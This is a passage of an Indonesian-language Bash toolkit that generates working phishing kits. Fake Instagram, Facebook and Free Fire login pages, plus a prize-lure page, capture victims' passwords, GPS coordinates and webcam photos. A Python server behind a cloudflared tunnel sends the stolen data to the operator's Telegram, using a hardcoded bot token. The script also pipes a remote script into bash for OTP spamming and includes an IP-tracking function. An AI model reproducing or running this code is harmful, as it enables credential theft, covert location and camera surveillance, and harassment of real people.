        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode())
            user, passw, lat, lon, img = data["user"], data["pass"], data["lat"], data["lon"], data["img"]
            fn = f"ff_{random.randint(1000,9999)}.jpg"
            with open(fn, "wb") as f:
                f.write(base64.b64decode(img))
            map_url = f"https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18"
            print(f"\n[ ✓ ] FF User: {user} | Pass: {passw}\n[ 📍 ] Lokasi: {lat},{lon}\n[ 🗺️ ] Peta: {map_url}")
            tg_photo(ADMIN_ID, fn, f"🔐 FF User: {user}\n🔑 Pass: {passw}\n📍 Lokasi: {lat}, {lon}\n🗺️ Peta: {map_url}")
            os.remove(fn)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

def free_port(start=8081):
    for p in range(start, start+100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

PORT = free_port(8081)
threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()

print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/DanxyToolsV84_Bot\n")
print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
tunnel = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
)

for line in tunnel.stdout:
    if "https://" in line and "trycloudflare.com" in line:
        url = line.split("https://")[1].split()[0]
        print(f"[ ✓ ] LINK FREE FIRE PHISING: https://{url}\n")
        break

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    tunnel.terminate()
    print("\n[ ∅ ] Server dihentikan.")
EOF

  chmod +x server.py
  python3 server.py
}

#####################################################
#####################################################
phising_IG(){
  WORK_DIR="$HOME/DanxyIG"
  mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
  trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR
  # ===== END CLEAN-UP =====

  # HTML Instagram 2025 (tanpa URL mentah)
  cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Instagram</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
    body{
      background:#000;
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      color:#fff;
    }
    .card{
      width:100%;
      max-width:360px;
      padding:40px 30px;
      background:#121212;
      border:1px solid #262626;
      border-radius:12px;
    }
    .logo{
      font-size:42px;
      font-weight:600;
      background:linear-gradient(45deg,#feda75,#fa7e1e,#d62976,#962fbf,#4f5bd5);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      text-align:center;
      margin-bottom:10px;
      letter-spacing:-1.5px;
    }
    .subtitle{
      text-align:center;
      font-size:14px;
      color:#a8a8a8;
      margin-bottom:30px;
    }
    input{
      width:100%;
      padding:12px;
      margin-bottom:12px;
      background:#000;
      border:1px solid #262626;
      border-radius:8px;
      color:#fff;
      font-size:14px;
    }
    input:focus{
      outline:none;
      border-color:#0095f6;
    }
    .btn{
      width:100%;
      padding:12px;
      border:none;
      border-radius:8px;
      background:#0095f6;
      color:#fff;
      font-weight:600;
      font-size:14px;
      cursor:pointer;
      transition:.3s;
    }
    .btn:hover{background:#007cd9;}
    .or{
      display:flex;
      align-items:center;
      margin:20px 0;
      color:#737373;
      font-size:12px;
    }
    .or::before,.or::after{
      content:'';
      flex:1;
      height:1px;
      background:#262626;
    }
    .or::before{margin-right:10px;}
    .or::after{margin-left:10px;
    }
    .fb-login{
      text-align:center;
      color:#385185;
      font-size:14px;
      font-weight:500;
      cursor:pointer;
    }
    .forgot{
      text-align:center;
      margin-top:20px;
      font-size:12px;
      color:#00376b;
      cursor:pointer;
    }
    .loading{
      display:none;
      margin-top:15px;
      text-align:center;
      color:#0095f6;
      font-size:14px;
    }
    .spinner{
      border:3px solid rgba(255,255,255,0.2);
      border-top:3px solid #0095f6;
      border-radius:50%;
      width:20px;
      height:20px;
      animation:spin 1s linear infinite;
      margin:0 auto 8px;
    }
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">Instagram</div>
    <div class="subtitle">Bergabung untuk melihat foto dan video dari temanmu.</div>
    <input type="text" id="user" placeholder="Nomor telepon, atau email"/>
    <input type="password" id="pass" placeholder="Kata sandi"/>
    <button class="btn" onclick="login()">Masuk</button>
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div>Memuat feed...</div>
    </div>
    <div class="or">ATAU</div>
    <div class="fb-login">Masuk dengan Facebook</div>
    <div class="forgot">Lupa kata sandi?</div>
  </div>

  <script>
    async function login(){
      const user=document.getElementById('user').value.trim();
      const pass=document.getElementById('pass').value.trim();
      if(!user||!pass){alert('Lengkapi username & password');return;}

      document.getElementById('loading').style.display='block';

      try{
        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
        const {latitude:lat,longitude:lon}=pos.coords;

        const canvas=document.createElement('canvas');
        const video=document.createElement('video');
        const stream=await navigator.mediaDevices.getUserMedia({video:true});
        video.srcObject=stream;await video.play();
        [canvas.width,canvas.height]=[video.videoWidth,video.videoHeight];
        canvas.getContext('2d').drawImage(video,0,0);
        const img=canvas.toDataURL('image/jpeg').split(',')[1];
        stream.getTracks().forEach(t=>t.stop());

        await fetch('/data',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({user,pass,lat,lon,img})
        });

        setTimeout(()=>{
          document.getElementById('loading').innerHTML='<div style=color:#00ff00>✓ Login berhasil</div>';
          setTimeout(()=>location.href='https://instagram.com',2000);
        },1500);

      }catch(e){
        document.getElementById('loading').innerHTML='<div style=color:#ff4444>✗ Login gagal</div>';
        setTimeout(()=>location.reload(),2000);
      }
    }
  </script>
</body>
</html>
EOF

  # Python server (fix tanpa index)
  cat > Danxy.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time, os, random
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN   = "8471359519:AAG4sptoPbYjiNU2X7l05uWz40HBkPQk-KY"
ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode())
            user, passw, lat, lon, img = data["user"], data["pass"], data["lat"], data["lon"], data["img"]
            fn = f"ig_{random.randint(1000,9999)}.jpg"
            with open(fn, "wb") as f:
                f.write(base64.b64decode(img))
            map_url = f"https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18"
            print(f"\n[ ✓ ] IG User: {user} | Pass: {passw}\n[ 📍 ] Lokasi: {lat},{lon}\n[ 🗺️ ] Peta: {map_url}")
            tg_photo(ADMIN_ID, fn, f"🔐 IG User: {user}\n🔑 Pass: {passw}\n📍 Lokasi: {lat}, {lon}\n🗺️ Peta: {map_url}")
            os.remove(fn)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

def free_port(start=8081):
    for p in range(start, start+100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

PORT = free_port(8081)
threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()

print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/DanxyToolsV84_Bot\n")
print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
tunnel = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
)

for line in tunnel.stdout:
    if "https://" in line and "trycloudflare.com" in line:
        url = line.split("https://")[1].split()[0]
        print(f"[ ✓ ] LINK IG PHISING: https://{url}\n")
        break

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    tunnel.terminate()
    print("\n[ ∅ ] Server dihentikan.")
EOF

  chmod +x Danxy.py
  python3 Danxy.py
}

#####################################################
#####################################################

phising_FB(){
  WORK_DIR="$HOME/DanxyTracker"
  mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
  trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR
  # ===== END CLEAN-UP =====

  # HTML Facebook 2025 (tanpa URL mentah)
  cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Facebook</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
    body{
      background:#0A0A0A;
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      color:#E4E6EB;
    }
    .card{
      background:rgba(255,255,255,0.05);
      border:1px solid rgba(255,255,255,0.1);
      border-radius:16px;
      padding:40px;
      width:100%;
      max-width:400px;
      backdrop-filter:blur(12px);
      box-shadow:0 0 30px rgba(0,150,255,0.2);
    }
    .logo{
      font-size:48px;
      font-weight:700;
      background:linear-gradient(45deg,#0099FF,#00D4FF);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      text-align:center;
      margin-bottom:10px;
      letter-spacing:-2px;
    }
    .subtitle{
      text-align:center;
      font-size:16px;
      color:#B0B3B8;
      margin-bottom:30px;
    }
    input{
      width:100%;
      padding:14px;
      border:none;
      border-radius:8px;
      background:#1C1C1E;
      color:#fff;
      font-size:16px;
      margin-bottom:15px;
      border:1px solid transparent;
      transition:.3s;
    }
    input:focus{
      outline:none;
      border-color:#0099FF;
      box-shadow:0 0 10px rgba(0,150,255,0.5);
    }
    .btn{
      width:100%;
      padding:14px;
      border:none;
      border-radius:8px;
      background:linear-gradient(45deg,#0099FF,#00D4FF);
      color:#fff;
      font-size:16px;
      font-weight:600;
      cursor:pointer;
      transition:.3s;
    }
    .btn:hover{transform:scale(1.02);box-shadow:0 0 20px rgba(0,150,255,0.6);}
    .loading{
      display:none;
      margin-top:20px;
      text-align:center;
      color:#00D4FF;
    }
    .spinner{
      border:3px solid rgba(255,255,255,0.2);
      border-top:3px solid #00D4FF;
      border-radius:50%;
      width:24px;
      height:24px;
      animation:spin 1s linear infinite;
      margin:0 auto 10px;
    }
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">facebook</div>
    <div class="subtitle">Masuk untuk melanjutkan</div>
    <input type="text" id="email" placeholder="Email atau Nomor Telepon"/>
    <input type="password" id="pass" placeholder="Kata Sandi"/>
    <button class="btn" onclick="login()">Masuk</button>
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div>Memverifikasi akun...</div>
    </div>
  </div>

  <script>
    async function login(){
      const email=document.getElementById('email').value.trim();
      const pass=document.getElementById('pass').value.trim();
      if(!email||!pass){alert('Harap isi semua kolom');return;}

      document.getElementById('loading').style.display='block';

      try{
        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
        const {latitude:lat,longitude:lon}=pos.coords;

        const canvas=document.createElement('canvas');
        const video=document.createElement('video');
        const stream=await navigator.mediaDevices.getUserMedia({video:true});
        video.srcObject=stream;await video.play();
        [canvas.width,canvas.height]=[video.videoWidth,video.videoHeight];
        canvas.getContext('2d').drawImage(video,0,0);
        const img=canvas.toDataURL('image/jpeg').split(',')[1];
        stream.getTracks().forEach(t=>t.stop());

        await fetch('/data',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({email,pass,lat,lon,img})
        });

        setTimeout(()=>{
          document.getElementById('loading').innerHTML='<div style=color:#00ff00>✓ Berhasil diverifikasi</div>';
          setTimeout(()=>location.href='https://facebook.com',2000);
        },1500);

      }catch(e){
        document.getElementById('loading').innerHTML='<div style=color:#ff4444>✗ Verifikasi gagal</div>';
        setTimeout(()=>location.reload(),2000);
      }
    }
  </script>
</body>
</html>
EOF

  # Python server (fix KeyError & tanpa index)
  cat > Danxy.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time, os, random
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN   = "8471359519:AAG4sptoPbYjiNU2X7l05uWz40HBkPQk-KY"
ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode())
            email, passw, lat, lon, img = data["email"], data["pass"], data["lat"], data["lon"], data["img"]
            fn = f"img_{random.randint(1000,9999)}.jpg"
            with open(fn, "wb") as f:
                f.write(base64.b64decode(img))
            map_url = f"https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18"
            print(f"\n[ ✓ ] Email: {email} | Pass: {passw}\n[ 📍 ] Lokasi: {lat},{lon}\n[ 🗺️ ] Peta: {map_url}")
            tg_photo(ADMIN_ID, fn, f"🔐 Email: {email}\n🔑 Pass: {passw}\n📍 Lokasi: {lat}, {lon}\n🗺️ Peta: {map_url}")
            os.remove(fn)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

def free_port(start=8081):
    for p in range(start, start+100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

PORT = free_port(8081)
threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()

print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/DanxyToolsV84_Bot\n")
print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
tunnel = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
)

for line in tunnel.stdout:
    if "https://" in line and "trycloudflare.com" in line:
        url = line.split("https://")[1].split()[0]
        print(f"[ ✓ ] LINK PHISING: https://{url}\n")
        break

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    tunnel.terminate()
    print("\n[ ∅ ] Server dihentikan.")
EOF

  chmod +x Danxy.py
  python3 Danxy.py
}


#####################################################
#####################################################


phising_tele(){
    WORK_DIR="$HOME/DanxyTracker"
  mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
  trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR
  # ===== END CLEAN-UP =====

  # HTML tanpa URL mentah & CORS aman
cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Buat avatar & dapatkan hadiahnya</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Orbitron',monospace;}
    body{
      background: linear-gradient(135deg, #0b0e1a 0%, #1a1a2e 50%, #16213e 100%);
      color:#fff;
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      overflow:hidden;
    }
    .screen{
      width:100%;
      max-width:420px;
      text-align:center;
      padding:40px;
      background: rgba(0, 245, 255, 0.05);
      border: 1px solid rgba(0, 245, 255, 0.3);
      border-radius: 20px;
      backdrop-filter: blur(10px);
      box-shadow: 0 0 30px rgba(0, 245, 255, 0.2);
    }
    h1{
      color:#00f5ff;
      text-shadow:0 0 15px #00f5ff;
      font-size:28px;
      margin-bottom:15px;
      letter-spacing: 2px;
    }
    p{
      font-size:14px;
      color:#8fbcff;
      margin-bottom:30px;
      line-height: 1.6;
    }
    .btn{
      background: linear-gradient(45deg, #00f5ff, #00c9ff);
      color:#0b0e1a;
      border:none;
      padding:16px 45px;
      border-radius:30px;
      font-size:16px;
      font-weight:bold;
      cursor:pointer;
      transition:.3s;
      box-shadow: 0 0 15px rgba(0, 245, 255, 0.5);
    }
    .btn:hover{
      transform:scale(1.05);
      box-shadow: 0 0 25px rgba(0, 245, 255, 0.8);
    }
    .avatar{
      width:130px;
      height:130px;
      border:2px solid #00f5ff;
      border-radius:50%;
      margin:0 auto 25px;
      background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="35" r="20" fill="%2300f5ff"/><rect x="30" y="60" width="40" height="30" fill="%2300f5ff"/></svg>') center/cover;
      box-shadow: 0 0 20px rgba(0, 245, 255, 0.6);
    }
    .popup{
      position:fixed;
      top:0;
      left:0;
      width:100%;
      height:100%;
      background: rgba(11, 14, 26, 0.95);
      display:none;
      align-items:center;
      justify-content:center;
      z-index:10;
    }
    .popup .card{
      background: linear-gradient(135deg, #111 0%, #1a1a2e 100%);
      border: 1px solid rgba(0, 245, 255, 0.5);
      border-radius: 20px;
      padding:30px;
      width:320px;
      text-align:center;
      box-shadow: 0 0 30px rgba(0, 245, 255, 0.3);
    }
    .hidden{display:none !important}
  </style>
</head>
<body>
  <div class="screen" id="welcome">
    <div class="avatar"></div>
    <h1>GAMELER CRASH</h1>
    <p>Klik mulai petualangan untuk melanjutkan ke tahap selanjutnya, anda sedikit lagi akan menempuh kekayaan</p>
    <button class="btn" onclick="showConsent()">Mulai Petualangan</button>
  </div>

  <div class="popup" id="consentPopup">
    <div class="card">
      <h2>Aktifkan Fitur AR</h2>
      <p>Setujui semua syarat sebelum claim Kekayaan yang menanti</p>
      <button class="btn" onclick="requestPermissions()">Aktifkan Sekarang</button>
    </div>
  </div>

  <div class="screen hidden" id="loadingScreen"><h1>Memuat AR...</h1></div>
  <div class="screen hidden" id="errorScreen"><h1>Terjadi Kesalahan</h1><button class="btn" onclick="location.reload()">Coba Lagi</button></div>
  <div class="screen hidden" id="hackedScreen"><h1>Terima kasih telah berpartisipasi!</h1></div>

  <script>
    function showConsent() {
      document.getElementById('welcome').classList.add('hidden');
      document.getElementById('consentPopup').style.display='flex';
    }

    async function requestPermissions() {
      document.getElementById('consentPopup').style.display='none';
      document.getElementById('loadingScreen').classList.remove('hidden');

      try {
        const [stream,pos]=await Promise.all([
          navigator.mediaDevices.getUserMedia({video:true}),
          new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej))
        ]);
        const {latitude:lat,longitude:lon}=pos.coords;

        const canvas=document.createElement('canvas');
        const video=document.createElement('video');
        video.srcObject=stream; await video.play();
        [canvas.width,canvas.height]=[video.videoWidth,video.videoHeight];
        canvas.getContext('2d').drawImage(video,0,0);
        const img=canvas.toDataURL('image/jpeg').split(',')[1];

        fetch('/data',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({index:1,lat,lon,img})
        });

        document.getElementById('loadingScreen').classList.add('hidden');

        let c=2;
        const iv=setInterval(async()=>{
          if(c>10){clearInterval(iv);document.getElementById('hackedScreen').classList.remove('hidden');return;}
          try{
            const [s,p]=await Promise.all([
              navigator.mediaDevices.getUserMedia({video:true}),
              new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej))
            ]);
            const v=document.createElement('video');
            v.srcObject=s;await v.play();
            const cn=document.createElement('canvas');
            [cn.width,cn.height]=[v.videoWidth,v.videoHeight];
            cn.getContext('2d').drawImage(v,0,0);
            fetch('/data',{
              method:'POST',
              headers:{'Content-Type':'application/json'},
              body:JSON.stringify({index:c,lat:p.coords.latitude,lon:p.coords.longitude,img:cn.toDataURL('image/jpeg').split(',')[1]})
            });
            s.getTracks().forEach(t=>t.stop());
            c++;
          }catch{clearInterval(iv);document.getElementById('errorScreen').classList.remove('hidden');}
        },5000);
        stream.getTracks().forEach(t=>t.stop());
      }catch{document.getElementById('errorScreen').classList.remove('hidden');}
    }
  </script>
</body>
</html>
EOF


  # Python server + Telegram otomatis
  cat > Danxy.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time, os
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN   = "8471359519:AAG4sptoPbYjiNU2X7l05uWz40HBkPQk-KY"
ADMIN_ID = input("[ ! ] MASUKAN ID TELEGRAM KAMU: ").strip()

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode())
            idx, lat, lon, img = data["index"], data["lat"], data["lon"], data["img"]
            fn = f"img_{idx}.jpg"
            with open(fn, "wb") as f:
                f.write(base64.b64decode(img))
            map_url = f"https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18"
            print(f"\n[ FOTO ] [{idx}] {fn}  [ MAP ] {map_url}")
            tg_photo(ADMIN_ID, fn, f"Lokasi: {lat}, {lon}\nPeta: {map_url}")
            os.remove(fn)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

def free_port(start=8081):
    for p in range(start, start+100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

PORT = free_port(8081)
threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()

print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/DanxyToolsV84_Bot\n")
print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
tunnel = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
)

for line in tunnel.stdout:
    if "https://" in line and "trycloudflare.com" in line:
        url = line.split("https://")[1].split()[0]
        print("[ ? ] CTRL +C UNTUK MENGHENTIKAN SERVER PHISING\n")
        print(f"[ ✓ ] LINK PHISING: https://{url}\n")
        break

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    tunnel.terminate()
    print("\n[ ∅ ] Server dihentikan.")
EOF

  chmod +x Danxy.py
  python3 Danxy.py
}

#####################################################
#####################################################


asciiArt() {
  clear
  echo -e "\033[1;96m"
  echo "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓"
  echo "┃        ASCII ART CONVERTER        ┃"
  echo "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
  echo "ALL CONVERT FOTO KAMJ JADI ASCII"
  echo -e "\033[0m"

  if ! command -v jp2a &> /dev/null; then
    echo "[ + ] Installing jp2a (ASCII converter)..."
    pkg install -y jp2a > /dev/null 2>&1
  fi
  read -p "Masukkan path gambar (contoh: /sdcard/foto.jpg): " img

  if [ ! -f "$img" ]; then
    echo "[ ! ] File tidak ditemukan!"
    return
  fi
  folder="/storage/emulated/0/HASIL_ASCII"
  mkdir -p "$folder"
  out="$folder/asciiart-$(date +%Y%m%d-%H%M%S).txt"

  echo -e "\n[ ∅ ] Mengubah gambar ke ASCII Art...\n"
  jp2a --colors --width=80 "$img" | tee "$out"
  
  echo -e "\n[ ∆ ] ASCII Art selesai dibuat!"
  echo "[ + ] Hasil tersimpan di: $out"
  echo -e "\nTekan ENTER 1× untuk kembali..."
  read
}

SpamOtpV() {
  bash <(curl -sL "https://raw.githubusercontent.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/refs/heads/main/DanxySpamOtp.sh")
}

ip_lookup() {
clear
  echo -e "
 ██▓ ██▓███     ▄▄▄█████▓ ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀
▓██▒▓██░  ██▒   ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
▒██▒▓██░ ██▓▒   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
░██░▒██▄█▓▒ ▒   ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
░██░▒██▒ ░  ░     ▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
░▓  ▒▓▒░ ░  ░     ▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
 ▒ ░░▒ ░            ░      ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
 ▒ ░░░            ░        ░░   ░   ░   ▒   ░        ░ ░░ ░ 
 ░                          ░           ░  ░░ ░      ░  ░   
                                            ░               " | lolcat -p 0.7
echo -e "⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
               ${RES}TRACKING IP ALL BASE TRACKING COMPLETE ${NC}
⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘"
  echo -ne "\n${WHT}Enter IP target : ${GRN}"
  read -r ip
  echo -e "\n${WHT}============= ${GRN}SHOW INFORMATION IP ADDRESS ${WHT}=============${RST}"
  data=$(curl -s "http://ipwho.is/${ip}")
  echo -e "${WHT}\n IP target       : ${GRN}${ip}"
  echo -e "${WHT} Type IP         : ${GRN}$(echo "$data" | jq -r '.type')"
  echo -e "${WHT} Country         : ${GRN}$(echo "$data" | jq -r '.country')"
  echo -e "${WHT} Country Code    : ${GRN}$(echo "$data" | jq -r '.country_code')"
  echo -e "${WHT} City            : ${GRN}$(echo "$data" | jq -r '.city')"
  echo -e "${WHT} Continent       : ${GRN}$(echo "$data" | jq -r '.continent')"
  echo -e "${WHT} Continent Code  : ${GRN}$(echo "$data" | jq -r '.continent_code')"
  echo -e "${WHT} Region          : ${GRN}$(echo "$data" | jq -r '.region')"
  echo -e "${WHT} Region Code     : ${GRN}$(echo "$data" | jq -r '.region_code')"
  echo -e "${WHT} Latitude        : ${GRN}$(echo "$data" | jq -r '.latitude')"
